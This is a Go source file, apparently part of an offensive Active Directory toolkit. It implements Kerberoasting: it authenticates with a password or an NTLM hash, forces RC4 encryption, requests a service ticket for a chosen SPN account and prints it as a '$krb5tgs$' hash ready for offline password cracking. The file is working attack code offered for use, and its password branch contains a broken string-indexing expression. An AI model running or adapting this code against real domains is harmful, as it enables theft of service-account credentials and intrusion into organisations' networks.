package Commands

import (
	"fmt"
        "strings"
        "encoding/hex"
	"github.com/go-ldap/ldap/v3"
        "github.com/jcmturner/gokrb5/v8/config"
        "github.com/jcmturner/gokrb5/v8/client"
        "github.com/jcmturner/gokrb5/v8/iana/etypeID"
        "log"
        "os"
)


const (
libdefault = `[libdefaults]
default_realm = %s
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 5
forwardable = yes
proxiable = true
default_tkt_enctypes = rc4-hmac
default_tgs_enctypes = rc4-hmac
noaddresses = true
udp_preference_limit=1
[realms]
%s = {
kdc = %s:88
default_domain = %s
    }`
)

func RequestSPN(targetUser string, baseDN string, conn *ldap.Conn, username string, password string, ntlm string, domain string, dc string) (spnResult string) {
    
    var cl *client.Client
    domain = strings.ToUpper(domain)

    l := log.New(os.Stderr, "GOKRB5 Client: ", log.Ldate|log.Ltime|log.Lshortfile)

    c, err := config.NewFromString(fmt.Sprintf(libdefault, domain, domain, dc, domain))

    if err != nil {
        l.Fatalf("Error Loading Config: %v\n", err)
    }
    
    if password != ""{
        // If the password is provided we do not want the NETBIOS name
        username = strings.Split(username, "\\"[1])
        cl = client.NewWithPassword(username, domain, password, c, client.DisablePAFXFAST(true), client.AssumePreAuthentication(false))
    }else if ntlm != ""{
        cl = client.NewWithHash(username, domain, ntlm, c, client.DisablePAFXFAST(true), client.AssumePreAuthentication(false))
    }

    err = cl.Login()
    if err != nil {
        l.Fatalf("Erron on AS_REQ: %v\n", err)
    }
 
    tgt, _, err := cl.GetServiceTicket(targetUser)
    
    // only printing out RC4 encrypted tickets currently 
    ticket := ""
    if err != nil {
        l.Printf("Error getting service ticket: %v\n", err)
    }else if tgt.EncPart.EType == etypeID.RC4_HMAC {
        checksumHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[:16])))
        hex.Encode(checksumHex, tgt.EncPart.Cipher[:16])

        cipherHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[16:])))
        hex.Encode(cipherHex, tgt.EncPart.Cipher[16:])
        ticket = fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n\n", tgt.EncPart.EType, tgt.SName.NameString[0], tgt.Realm, tgt.SName.NameString[0], checksumHex, cipherHex)
    }
   return ticket
}

